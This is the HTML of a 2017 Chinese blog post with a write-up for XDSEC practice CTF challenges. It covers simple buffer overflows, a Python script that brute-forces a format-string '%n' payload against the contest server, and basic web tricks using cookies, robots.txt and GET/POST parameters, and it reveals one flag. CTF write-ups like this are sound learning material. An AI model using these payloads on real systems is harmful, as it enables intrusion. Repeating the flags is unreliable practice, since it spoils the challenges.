@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>XDSEC 西电CTF练习题WriteUp | Banyan&#39;Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="西电ctf练习题地址(http://moectf.xdsec.club)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XDSEC 西电CTF练习题WriteUp">
+<meta property="og:url" content="http://yoursite.com/2017/11/26/XDSEC 西电CTF练习题WriteUp/index.html">
+<meta property="og:site_name" content="Banyan&#39;Blog">
+<meta property="og:description" content="西电ctf练习题地址(http://moectf.xdsec.club)">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905122033712?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905122149919?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904003021962?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904003448959?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905124015270?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905124712606?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905124827335?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905125408854?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170906111407335?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170906111434038?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903212254419?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903214143938?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903214228928?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903214908188?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903215148334?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903215522708?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903220451528?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903220754130?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903220923852?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903221518732?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903222331647?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903223928722?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903224527615?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903231358629?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170903233359897?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904000535041?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904000804898?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904001457325?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904001646861?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904203646647?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905175625167?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170904235534742?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905000048360?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905000151406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905001750511?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905221001424?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905003101271?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905003344694?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905004215419?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905004710032?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905004749041?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170905010106131?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2017-11-26T14:18:56.966Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XDSEC 西电CTF练习题WriteUp">
+<meta name="twitter:description" content="西电ctf练习题地址(http://moectf.xdsec.club)">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170905122033712?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+  
+    <link rel="alternative" href="/atom.xml" title="Banyan&#39;Blog" type="application/atom+xml">
+  
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Banyan</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">让学习成为一种习惯</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/works">作品展示</a></li>
+                        
+                            <li><a href="/about">留言打卡</a></li>
+                        
+                            <li><a href="/FrontEndGuide">前端导航</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/Banyantoo" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/banyan-51/activities" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="https://weibo.com/u/5037099559" title="weibo">weibo</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/Banyantoo" title="twitter">twitter</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://luuman.github.io/">name</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一个热爱信息安全的dog</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Banyan</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Banyan</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">让学习成为一种习惯</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/works">作品展示</a></li>
+                
+                    <li><a href="/about">留言打卡</a></li>
+                
+                    <li><a href="/FrontEndGuide">前端导航</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/Banyantoo" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/banyan-51/activities" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/u/5037099559" title="weibo">weibo</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/Banyantoo" title="twitter">twitter</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-XDSEC 西电CTF练习题WriteUp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/11/26/XDSEC 西电CTF练习题WriteUp/" class="article-date">
+      <time datetime="2017-11-26T13:44:59.749Z" itemprop="datePublished">2017-11-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XDSEC 西电CTF练习题WriteUp
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>西电ctf练习题地址(<a href="http://moectf.xdsec.club" target="_blank" rel="noopener">http://moectf.xdsec.club</a>)</p>
+<a id="more"></a>
+<h3 id="1-1丶PPC"><a href="#1-1丶PPC" class="headerlink" title="1.1丶PPC"></a>1.1丶PPC</h3><h1 id="1丶算术天才琪露洛-200"><a href="#1丶算术天才琪露洛-200" class="headerlink" title="1丶算术天才琪露洛(200)"></a>1丶算术天才琪露洛(200)</h1><p>这题原意是要我们编程实现，但经过分析发现，每次输入9都会是正确的。。<br><img src="http://img.blog.csdn.net/20170905122033712?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>①题目说有99道题，那么输入99次就可以得到flag了。。<br><img src="http://img.blog.csdn.net/20170905122149919?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>②当然上面是笨方法，我们也可以写个脚本爆破。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">()</span>:</span></span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">'123.206.66.98'</span>, <span class="number">10001</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        send_data = <span class="string">'9\n'</span></span><br><span class="line">        <span class="keyword">print</span> client.recv(<span class="number">1024</span>)</span><br><span class="line">        client.send(send_data)</span><br><span class="line">    client.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    client_sender()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<h1 id="2丶猜数游戏-500"><a href="#2丶猜数游戏-500" class="headerlink" title="2丶猜数游戏(500)"></a>2丶猜数游戏(500)</h1><p>不会，学习一波会了在来更新-^-..</p>
+<h3 id="2丶PWN"><a href="#2丶PWN" class="headerlink" title="2丶PWN"></a>2丶PWN</h3><h1 id="1-PWNO-100"><a href="#1-PWNO-100" class="headerlink" title="1.PWNO(100)"></a>1.PWNO(100)</h1><p>下载提供的c代码，分析下应该是数组越界<br><img src="http://img.blog.csdn.net/20170904003021962?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>定义的字符数组只能容纳20个数组，但scanf对我们的输入却没有进行限制，输出超出20个字符就会造成数组越界，尝试输入21个1得到了flag。。<br><img src="http://img.blog.csdn.net/20170904003448959?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="2-Easy-bof-300"><a href="#2-Easy-bof-300" class="headerlink" title="2.Easy bof(300)"></a>2.Easy bof(300)</h1><p>一个简单缓冲区溢出，分析如下图所示：<br><img src="http://img.blog.csdn.net/20170905124015270?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>那么要想覆盖到key变量的地址，我们就得用ida分析获取输入的地址和key地址的相对差值了。。<br>下载2进制文件，拖入ida。。<br><img src="http://img.blog.csdn.net/20170905124712606?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20170905124827335?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>得到s的地址为-28，a1的地址为8，8-(-28)得到需要覆盖的字节为48<br>直接用python生成字符串提交得到flag。。<br><img src="http://img.blog.csdn.net/20170905125408854?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="3丶FSB-500"><a href="#3丶FSB-500" class="headerlink" title="3丶FSB(500)"></a>3丶FSB(500)</h1><p>字符格式化漏洞，可以利用%x来flag变量所在的位置，然后用%n来修改该位置的值，位置可以用爆破，那就写段py脚本爆破吧！<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        client = socket.socket()</span><br><span class="line">        client.connect((<span class="string">'123.206.66.98'</span>, <span class="number">23333</span>))</span><br><span class="line">        send_data = <span class="string">'%2000c%'</span>+str(i)+<span class="string">'$n\n'</span></span><br><span class="line">        client.send(send_data)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'进行第'</span>+str(i)+<span class="string">'尝试，尝试结果为：'</span>+client.recv(<span class="number">1024</span>)</span><br><span class="line">        --i</span><br><span class="line">        client.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    client_sender()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<p>在21和31处都可得到flag。。<br><img src="http://img.blog.csdn.net/20170906111407335?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20170906111434038?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h3 id="3丶WEB"><a href="#3丶WEB" class="headerlink" title="3丶WEB"></a>3丶WEB</h3><h1 id="1丶where-is-flag-10"><a href="#1丶where-is-flag-10" class="headerlink" title="1丶where is flag?(10)"></a>1丶where is flag?(10)</h1><p><strong>直接查看源代码</strong><br><img src="http://img.blog.csdn.net/20170903212254419?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="2丶饼干-30"><a href="#2丶饼干-30" class="headerlink" title="2丶饼干(30)"></a>2丶饼干(30)</h1><p>根据提示，flag应该在cookie里面<br><img src="http://img.blog.csdn.net/20170903214143938?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>抓包查看cookie得到flag<br><img src="http://img.blog.csdn.net/20170903214228928?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>根据（hint:如果你觉得得到的FLAG不太对劲的话，查查什么是URL编码），要将%7B和%7D进行一下编码转换，得到最终的flag：XDSEC{c00kie_1s_Del1ciou5}</p>
+<h1 id="3丶机器人-30"><a href="#3丶机器人-30" class="headerlink" title="3丶机器人(30)"></a>3丶机器人(30)</h1><p>根据提示直接访问robots.txt得到flag<br><img src="http://img.blog.csdn.net/20170903214908188?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="4丶GET-50"><a href="#4丶GET-50" class="headerlink" title="4丶GET(50)"></a>4丶GET(50)</h1><p>根据提示直接get flag参数设置值为1得到flag<br><img src="http://img.blog.csdn.net/20170903215148334?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="5丶POST-80"><a href="#5丶POST-80" class="headerlink" title="5丶POST(80)"></a>5丶POST(80)</h1><p>跟上一题差不多，只是把get变成post，这里我用的火狐的hackbor提交的post数据<br><img src="http://img.blog.csdn.net/20170903215522708?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
